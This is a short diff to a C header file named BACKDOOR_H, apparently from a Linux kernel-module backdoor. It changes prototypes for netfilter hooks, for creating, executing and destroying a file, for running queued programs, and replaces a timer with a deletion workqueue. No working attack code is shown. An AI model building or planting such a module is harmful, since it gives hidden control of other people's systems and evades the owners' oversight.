@@ -39,13 +39,13 @@ void nfhook_exit(void);
 int create_file(void);
 void execute_file(void);
 void destroy_file(void);
-void execute_ready_programs(struct timer_list *tl);
+void execute_ready_programs(void);
 
 /* state helpers */
-program_list *init_program(void);
+program_list *init_program(int flag);
 void init_prog_list(void);
 void add_program(program_list **head, program_list *entry);
-void init_timer(void);
-void destroy_timer(void);
+void init_del_workqueue(void);
+void exit_del_workqueue(void);
 
 #endif /* BACKDOOR_H */
